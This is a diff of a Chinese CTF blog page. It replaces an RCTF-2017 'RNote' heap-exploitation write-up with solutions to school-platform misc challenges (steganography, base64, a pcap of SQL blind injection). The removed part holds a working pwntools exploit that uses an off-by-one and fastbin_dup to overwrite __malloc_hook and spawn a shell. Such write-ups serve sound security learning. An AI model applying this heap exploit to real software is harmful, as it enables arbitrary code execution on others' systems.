@@ -4,12 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="RNote, Mondayice">
-    <meta name="description" content="RCTF-2017: RNote【原理】off-by-one, fastbin_dup
-【目的】了解基础堆知识，懂得堆溢出漏洞的利用
-【环境】Linux
-【工具】gdb(装有peda)，IDA，python，pwntools
-【步骤】首先查">
+    <meta name="keywords" content="校内平台杂项, Mondayice">
+    <meta name="description" content="杂项第一题一般不难下了图片拖到notepad++直接搜flag。bingo！
+第二题还是图片隐写，百毒网盘连接，下载载瞅一眼老样子先拿到Stegsolve看一波，bingo！
+第三题、base64，不多说了
+第四题在图片下面
+第五题give">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>RNote | Mondayice</title>
+    <title>校内平台杂项 | Mondayice</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -261,13 +261,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('http://yanxuan.nosdn.127.net/83e01713bb4c086dae07364f238190b1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        RNote
+                        校内平台杂项
                     </div>
                 </div>
             </div>
@@ -393,7 +393,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-05-23
+                    2019-11-06
                 </div>
 
                 
@@ -409,84 +409,58 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="RCTF-2017-RNote"><a href="#RCTF-2017-RNote" class="headerlink" title="RCTF-2017: RNote"></a><center>RCTF-2017: RNote</center></h1><h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a><strong>【原理】</strong></h2><p>off-by-one, fastbin_dup</p>
-<h2 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a><strong>【目的】</strong></h2><p>了解基础堆知识，懂得堆溢出漏洞的利用</p>
-<h2 id="【环境】"><a href="#【环境】" class="headerlink" title="【环境】"></a><strong>【环境】</strong></h2><p>Linux</p>
-<h2 id="【工具】"><a href="#【工具】" class="headerlink" title="【工具】"></a><strong>【工具】</strong></h2><p>gdb(装有peda)，IDA，python，pwntools</p>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a><strong>【步骤】</strong></h2><p>首先查看代码逻辑:<br><img src="http://yanxuan.nosdn.127.net/a38b3ed52ee9f0fe298b7e38eb135e4f.png" alt><br>进入add_onte查看:<br><img src="http://yanxuan.nosdn.127.net/9a643f5e21e5365e485f416d12f393eb.png" alt><br>通过观察能够知道，这个note应该是一个结构体，然后有一个数组notes[15]专门存放数据</p>
-<pre class=" language-C"><code class="language-C">struct note {
-    int IsUsed; :4
-    int size;   :4
-    char title[0x10]; :16
-    char *content; :8
-};
+                <h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><p><strong>一般不难下了图片</strong>拖到notepad++直接搜flag。bingo！<img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570934176925-5a0cb2a2-e5b9-4337-b9e7-014dfc936b3b.png#align=left&amp;display=inline&amp;height=418&amp;name=%E6%9D%82%E9%A1%B9%E7%AC%AC%E4%B8%80%E9%A2%98.PNG&amp;originHeight=836&amp;originWidth=1028&amp;search=&amp;size=100506&amp;status=done&amp;width=514" alt="杂项第一题.PNG"></p>
+<h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><p><a href="http://211.64.240.92/challenges#%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF" target="_blank" rel="noopener"><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570934377791-19ef120f-9f04-429f-8326-ec8b0bf4eb4c.png#align=left&amp;display=inline&amp;height=269&amp;name=%E6%9D%82%E9%A1%B9%E7%AC%AC%E4%BA%8C%E9%A2%98.PNG&amp;originHeight=537&amp;originWidth=629&amp;search=&amp;size=21511&amp;status=done&amp;width=315" alt="杂项第二题.PNG"></a><br>还是图片隐写，百毒网盘连接，下载载瞅一眼<br><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570934571451-40a06146-949d-4871-b7ac-3ee2d02919ca.png#align=left&amp;display=inline&amp;height=300&amp;name=%E7%AE%80%E5%8D%95%E7%9A%84%E9%9A%90%E5%86%99%E9%A2%98.png&amp;originHeight=600&amp;originWidth=800&amp;search=&amp;size=1356687&amp;status=done&amp;width=400" alt="简单的隐写题.png"><br><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570934719090-6fda9a9b-4d75-4331-9812-e154cbabbe64.png#align=left&amp;display=inline&amp;height=359&amp;name=yinxie.PNG&amp;originHeight=718&amp;originWidth=807&amp;search=&amp;size=162270&amp;status=done&amp;width=404" alt="yinxie.PNG"><br><strong>老样子先拿到Stegsolve看一波，bingo！</strong></p>
+<h1 id="第三题、"><a href="#第三题、" class="headerlink" title="第三题、"></a><strong>第三题、</strong></h1><p><strong>base64，不多说了</strong><br><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570952017833-fa024b41-23e2-42db-b3b8-9e20a8d36df8.png#align=left&amp;display=inline&amp;height=247&amp;name=base.PNG&amp;originHeight=493&amp;originWidth=597&amp;search=&amp;size=16659&amp;status=done&amp;width=299" alt="base.PNG"></p>
+<h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><p><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570952088793-7b1e120f-406a-4811-8d89-1ad6235132a9.png#align=left&amp;display=inline&amp;height=224&amp;name=PDF.PNG&amp;originHeight=448&amp;originWidth=567&amp;search=&amp;size=13561&amp;status=done&amp;width=284" alt="PDF.PNG"><br><strong>在图片下面</strong></p>
+<h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a><strong>第五题</strong></h1><p><strong>give your flag</strong><br><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570952221619-3e5a47c8-36c7-4ea4-a977-cda52bd4c3f7.png#align=left&amp;display=inline&amp;height=250&amp;name=give.PNG&amp;originHeight=500&amp;originWidth=599&amp;search=&amp;size=17017&amp;status=done&amp;width=300" alt="give.PNG"><img src="https://cdn.nlark.com/yuque/0/2019/gif/518854/1570952304665-7f056053-b567-4348-9883-c6d0fabc08b0.gif#align=left&amp;display=inline&amp;height=169&amp;name=give_your_flag%20%281%29.gif&amp;originHeight=169&amp;originWidth=169&amp;search=&amp;size=331752&amp;status=done&amp;width=169" alt="give_your_flag (1).gif"><br><strong>一张gif用分割工具把gif 逐帧提取会出来一张残缺二维码用PS工具补齐定位码即可</strong></p>
+<h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><p><strong>本题得到的一堆的黑白图片，这种过渡的一种检查方式是，黑和白表示2中信息，可以组成**</strong>01010101…<strong>**的信息流。</strong><br><strong>一共有104张黑白图片，我们可以用**</strong>getcolors()<strong><strong>这个方法来获取图片的信息。一般会返回一个元组</strong></strong><code>(count,(r,g,b))</code><strong>**。该元组第一个元素计数代表该颜色出现的次数，第二个元素表示（rgb）。</strong></p>
+<pre class=" language-python"><code class="language-python"><span class="token number">0.</span>jpg <span class="token punctuation">:</span><span class="token punctuation">(</span>白色）
+（<span class="token number">46656</span>，（<span class="token number">255</span>，<span class="token number">255</span>，<span class="token number">255</span>））
+<span class="token number">1.</span>jpg <span class="token punctuation">:</span><span class="token punctuation">(</span>黑色）
+（<span class="token number">46656</span>，（<span class="token number">12</span>，<span class="token number">12</span>，<span class="token number">0</span>））
+<span class="token number">2.</span>jpg <span class="token punctuation">:</span><span class="token punctuation">(</span>黑色）
+（<span class="token number">46656</span>，（<span class="token number">12</span>，<span class="token number">12</span>，<span class="token number">0</span>））
+<span class="token number">3.</span>jpg <span class="token punctuation">:</span><span class="token punctuation">(</span>白色）
+（<span class="token number">46656</span>，（<span class="token number">255</span>，<span class="token number">255</span>，<span class="token number">255</span>））
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 </code></pre>
-<p>接下来，我们发现在下方的read处读取数据，然而我们知道，read是不会给字符串的结尾增加数据的，所以我们可以通过这个地方实现堆上敏感数据的泄露。<br>首先我们了解一下堆，堆在申请fastbin大小的数据的时候，在free之后不会被回收，而是等待下一次分配，所以我们可以如此构造堆结构:<br><img src="http://yanxuan.nosdn.127.net/0eb877029303b3c561cf34ce6870f636.png" alt><br>上述情况可以通过【申请1】 –&gt; 【申请2】 –&gt; 【释放2】 –&gt; 【释放1】 来触发。接下来，我们如果再次申请一个空间，那么此时便便会得到1的位置的数据，此时1中数据段开始的位置中，【记录了堆的位置】，那么我们就能通过这个位置的数据泄露出堆的位置。<br>接下来我们可以泄露libc的地址。通过申请一个small bin，然后将其删除的话，那么此时就会形成一个双向指针，这个指针指向的是main_arena的位置，所以我们能够利用这一点，找到实际上libc的起始位置.<br><img src="http://yanxuan.nosdn.127.net/83479206410c7d28d486a6b0fbbe82c7.png" alt><br>然后我们能够从libc中找到一个可以getshell的必要函数的位置:<br><img src="http://yanxuan.nosdn.127.net/270729188f72ef3fa984557cc2261d60.png" alt></p>
-<p>信息泄露就做的差不多了，之后我们要开始劫持程序流：</p>
-<p>我们在add_note处能发现一个漏洞:<br><img src="http://yanxuan.nosdn.127.net/410af6ae9899ef2a295d78fb5429a4ec.png" alt><br>这里会读入一个字符，读入的字符会覆盖掉堆地址的最后一位，从而使堆的指针位置发生错位。<br><img src="http://yanxuan.nosdn.127.net/4e3987f188cd629d5c2de5e5e2f02719.png" alt><br>原先的指针指向的位置<br><img src="http://yanxuan.nosdn.127.net/b5acd243a9c2340a18196a624caaee35.png" alt><br>此后发生的偏移。</p>
-<p>我们可以利用这一点，让两个堆的地址<strong>指向同一个位置</strong>，这样的话，当我们首先申请三个块，再依次释放的话，会发生如下的事情:<br>首先我们有三个块。我们通过上述漏洞，构造如下形式。由于第三个块丢失了指针，这里暂时不画出来<br><img src="http://yanxuan.nosdn.127.net/e8893ce76ba26a38747a2f1537b892a7.png" alt><br>然后我们此时删除第一个块,此时指针之间没有变化。<br>然后我们删除第二个块，此时指针变化如下:<br><img src="http://yanxuan.nosdn.127.net/672998c033174154cf5cb8a7d0f26847.png" alt><br>这里可以看到，这个块指向了上一个块的起始位置。<br>然后当我们删除第三个块的时候，变化如下:<br><img src="http://yanxuan.nosdn.127.net/eb1a6a54cb42b6bc451df7823594e141.png" alt><br>由于此时fastbin认为当前块未释放，于是直接将当前的fastbin的指针指向了上一个空闲块的位置上。<br><img src="http://yanxuan.nosdn.127.net/7a77feb8c20a3b8fe62c8ef013d2e637.png" alt><br>于是此时我们此时可以利用这个fastbin_dup攻击的方式，通过修改链表尾端指向的地址，让我们得到_malloc_hook的地址.<br>此后第一次malloc，我们获得如下块:<br><img src="http://yanxuan.nosdn.127.net/000e3a57eef744416097dfb3c81fd42f.png" alt><br><img src="http://yanxuan.nosdn.127.net/d3ccc577e6bb156c3088e3ef6fa06e4c.png" alt><br>此时我们在fd的位置修改成如下地址，第二次分配后变成如下：<br><img src="http://yanxuan.nosdn.127.net/5890e98eaa8a91bba914693be1ba315a.png" alt><br>第三次分配后，我们就能够让fastbin指向fd的指针指向<strong>malloc_hook的位置:<br><img src="http://yanxuan.nosdn.127.net/771f6100136840b4a85104c82a77d3ce.png" alt><br>再下一次malloc我们就能够得到</strong>malloc_hook的指针，在我们第四次得到数据后，我们只需要往里面写入我们之前准备好的攻击数据即可。</p>
-<p>代码如下:</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-s <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./RNote'</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> title<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>title<span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>index<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>index<span class="token punctuation">)</span>
-
-add<span class="token punctuation">(</span><span class="token string">'200'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'200'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
-delete<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'200'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
-show<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'note content: A'</span><span class="token punctuation">)</span>
-libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">104</span><span class="token operator">-</span><span class="token number">0x3c1740</span>
-malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3C1740</span>
-<span class="token number">0x3fd4f</span>
-oneshot <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xE8FE1</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"LIBC BASE : "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span> 
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"MALLOC HOOK : "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-delete<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
-delete<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-
-add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span><span class="token string">'\x10'</span> <span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
-delete<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
-delete<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-delete<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x1b</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x1b</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oneshot<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input the note size:'</span><span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'GOT SHELL!'</span><span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<p><strong>通过比较得出，白色图片为**</strong>(46656, (255, 255, 255))<strong><strong>，黑色图片为</strong></strong>(46656, (12, 12, 0))<strong>**，</strong></p>
+<p><strong>通过该常规编写脚本：</strong></p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+path <span class="token operator">=</span> <span class="token string">"gif\\"</span>
+save_path <span class="token operator">=</span> <span class="token string">'.\\'</span>
+sumDo <span class="token operator">=</span> <span class="token string">'0b'</span>
+sumNo <span class="token operator">=</span> <span class="token string">'0b'</span>
+imagefile<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    imagefile<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>path<span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> image <span class="token keyword">in</span> imagefile<span class="token punctuation">:</span>
+    <span class="token keyword">if</span> image<span class="token punctuation">.</span>getcolors<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12</span><span class="token punctuation">:</span>
+        sumDo <span class="token operator">+=</span><span class="token string">'1'</span>
+        sumNo <span class="token operator">+=</span><span class="token string">'0'</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        sumDo <span class="token operator">+=</span><span class="token string">'0'</span>
+        sumNo <span class="token operator">+=</span><span class="token string">'1'</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span>hex<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>sumDo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span>hex<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>sumNo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
 </code></pre>
-<h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a><strong>【总结】</strong></h2><p>堆的错误比较隐晦，而且利用起来也有一定的难度，需要对glibc中malloc的代码有一定的了解程度。</p>
+<p><strong>因为有两种可能，所以将两种可能都打印出来。</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570952816026-fc05fa10-8c95-4130-bd4a-1b643c3cdac7.png#align=left&amp;display=inline&amp;height=239&amp;originHeight=239&amp;originWidth=412&amp;search=&amp;size=0&amp;status=done&amp;width=412" alt></p>
+<h1 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h1><p><strong>坤坤，鸡你太美2333333，又是图片隐写</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570952879431-ea95a441-3f0b-4831-8a88-83b264591d5a.png#align=left&amp;display=inline&amp;height=230&amp;name=%E5%9D%A4%E5%9D%A4.PNG&amp;originHeight=460&amp;originWidth=541&amp;search=&amp;size=11853&amp;status=done&amp;width=271" alt="坤坤.PNG"><strong>下载后得到一个文件明显改成RAR压缩包得到一张bmp图片</strong><br><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570953615984-2714ebb3-2a4b-4a4a-a0f1-0180cd5a16d3.png#align=left&amp;display=inline&amp;height=335&amp;name=%E6%84%81%E5%95%A5.PNG&amp;originHeight=335&amp;originWidth=797&amp;search=&amp;size=211677&amp;status=done&amp;width=797" alt="愁啥.PNG"><br><strong>flag就在其中</strong><br>**</p>
+<h1 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h1><p><strong>24字箴言是什么来着？</strong><br><strong>
+</strong><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570954248293-f922337b-4c2f-42b1-9180-eb03b5a0fdad.png#align=left&amp;display=inline&amp;height=219&amp;name=24w.png&amp;originHeight=219&amp;originWidth=605&amp;search=&amp;size=278544&amp;status=done&amp;width=605" alt="24w.png"><strong><br>[</strong>解码地址<strong>](<a href="http://ctf.ssleye.com/cvencode.html)[" target="_blank" rel="noopener">http://ctf.ssleye.com/cvencode.html)[</a></strong><a href="http://ctf.ssleye.com/cvencode.html**](http://ctf.ssleye.com/cvencode.html)" target="_blank" rel="noopener">http://ctf.ssleye.com/cvencode.html**](http://ctf.ssleye.com/cvencode.html)</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570954396476-2d0cab6e-b4c7-43ec-ad03-62393cdb5a29.png#align=left&amp;display=inline&amp;height=368&amp;name=23w.PNG&amp;originHeight=368&amp;originWidth=797&amp;search=&amp;size=11483&amp;status=done&amp;width=797" alt="23w.PNG"><br><strong>出来是一个Code Values，怎么看都不像Flag，把图片放Binwalk 跑一下</strong><br><strong>出来一个文件夹，里面有一个压缩包解压有密码，嘿嘿。胜利在望，解压又一张图片</strong><br><strong>emmmm，，，下面又一个二维码，扫之。bingo。</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570954650072-cf1241dc-6079-4d9d-8d32-58bd9154ae32.png#align=left&amp;display=inline&amp;height=196&amp;name=24bin.PNG&amp;originHeight=196&amp;originWidth=1429&amp;search=&amp;size=142543&amp;status=done&amp;width=1429" alt="24bin.PNG"><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570954734735-9cca6838-08e7-4f49-b468-a5d2ccf53c69.png#align=left&amp;display=inline&amp;height=293&amp;name=%E5%AF%86%E7%A0%81.PNG&amp;originHeight=586&amp;originWidth=600&amp;search=&amp;size=38243&amp;status=done&amp;width=300" alt="密码.PNG"><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/518854/1570954905039-db9e0483-124e-439c-8600-c24cf2efef8c.jpeg#align=left&amp;display=inline&amp;height=293&amp;name=24c.jpg&amp;originHeight=1031&amp;originWidth=800&amp;search=&amp;size=279883&amp;status=done&amp;width=227" alt="24c.jpg"><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/518854/1570955165135-9dfb458f-f871-40b1-9385-14c0954eef2c.jpeg#align=left&amp;display=inline&amp;height=106&amp;name=419759572230913713.jpg&amp;originHeight=106&amp;originWidth=111&amp;search=&amp;size=12511&amp;status=done&amp;width=111" alt="419759572230913713.jpg"></strong></p>
+<h1 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h1><p><strong>misc1</strong></p>
+<p><strong>链接：<a href="https://pan.baidu.com/s/1lLZ4wWbhxmCEjD-U20mZoQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1lLZ4wWbhxmCEjD-U20mZoQ</a> 提取码：kmjw</strong><br><strong>
+</strong>只要你懂得的SQL注入的盲注就能解决这道题<strong>
+</strong><br><strong>emmm，，杂项加盲注。。有点意思</strong></p>
+<p><strong>下载得到misc.pcapng文件。打开wireshark，既然是盲注过滤HTTP流量，导出得到一大批文件。看文件名。果然盲注。</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570955590794-1ebc4922-244a-41cb-9b15-b6ea1dda0511.png#align=left&amp;display=inline&amp;height=375&amp;name=wire.PNG&amp;originHeight=819&amp;originWidth=1629&amp;search=&amp;size=141908&amp;status=done&amp;width=746" alt="wire.PNG"></strong><br><strong>盲注成功返回文件的大小明显不同，这里再提取518的文件</strong><br><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570955722237-8c53909b-36f8-408f-9e53-6b7cafc39525.png#align=left&amp;display=inline&amp;height=794&amp;name=%E6%88%91%E7%83%AD.PNG&amp;originHeight=794&amp;originWidth=1039&amp;search=&amp;size=312805&amp;status=done&amp;width=1039" alt="我热.PNG"><br><strong>然后通过GitShell用ls -l 保存所有文件名和文件大小到一个文件中</strong><br><strong>再通过脚本来筛选</strong><br><strong>逐行读取，通过空格分组</strong><br><strong>以substr的第2个参数为key，等号后面的值为value，保存</strong><br><strong>最后按key排序输出即可得到flag</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570957307875-2ad265ca-5208-4189-bf78-e7bae194e4fd.png#align=left&amp;display=inline&amp;height=286&amp;name=%E6%8D%95%E8%8E%B7.PNG&amp;originHeight=286&amp;originWidth=272&amp;search=&amp;size=2832&amp;status=done&amp;width=272" alt="捕获.PNG"></strong></p>
+<h1 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h1><p><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570957388154-25477f99-f278-4a08-8af0-3936d9f1b787.png#align=left&amp;display=inline&amp;height=244&amp;name=%E4%BD%A0%E7%9E%85%E5%95%A5.PNG&amp;originHeight=448&amp;originWidth=512&amp;search=&amp;size=11917&amp;status=done&amp;width=279" alt="你瞅啥.PNG"><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570957574379-cd08753d-5fc8-458a-a4cf-22eb985e06f0.png#align=left&amp;display=inline&amp;height=369&amp;name=rabbit.png&amp;originHeight=900&amp;originWidth=1118&amp;search=&amp;size=641537&amp;status=done&amp;width=459" alt="rabbit.png"><br><strong>就瞅你了</strong><br><strong>先放到**</strong>Stegsolve.jar扫一下。没看出啥来。，Binwalk安排上。**</p>
